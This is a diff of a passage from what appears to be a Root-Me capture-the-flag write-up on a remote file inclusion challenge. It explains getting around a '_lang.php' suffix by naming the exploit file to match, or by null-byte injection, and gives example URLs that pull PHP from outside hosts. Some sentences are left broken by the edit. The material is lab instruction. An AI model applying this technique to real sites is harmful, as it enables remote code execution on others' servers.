@@ -69,12 +69,13 @@ echo "</pre>";
 ?>
 ```
 
-#### 
+#### Get the flag 
 
 Another thing to be considered, we know that the include function has a trailing string, the “_lang.php”. This also must be bypassed otherwise we can not load the correct file. There are 2 ways that I know to bypass it:
 
-1. Make the exploit file has a trailing “_lang.php” string, for example, myexploit_lang.php. So when you call the file, you can call them like this, http://challenge01.root-me.org/web-serveur/ch13/?lang=[https://kopikulogojek.000webhostapp.com/m](https://kopikulogojek.000webhostapp.com/rootme-rfi-exploit)yexploit. So when this link is used, it will be like, include(“[https://kopikulogojek.000webhostapp.com/m](https://kopikulogojek.000webhostapp.com/rootme-rfi-exploit)yexploit_lang.php”);
-2. We use null byte injection, hence we can control the file we want to include. The request will be like [https://kopikulogojek.000webhostapp.com/m](https://kopikulogojek.000webhostapp.com/rootme-rfi-exploit)yexploit.php%00. But, unfortunately, this PHP version is already later than PHP 5.3, hence the null byte injection vulnerability has been patched.
+1. Make the exploit file has a trailing “_lang.php” string, for example, myexploit_lang.php. So when you call the file, you can call them like this, . So when this link is used, it will be like, include(“https://h4ckrati.github.io/rfi-test/exploit_lang.php”);
+
+2. We use null byte injection, hence we can control the file we want to include. The request will be like [https://kopikulogojek.000webhostapp.com/m](https://kopikulogojek.000webhostapp.com/rootme-rfi-exploit)exploit.php%00. But, unfortunately, this PHP version is already later than PHP 5.3, hence the null byte injection vulnerability has been patched.
 
 So that is our strategy blueprint, now we will execute them.
 
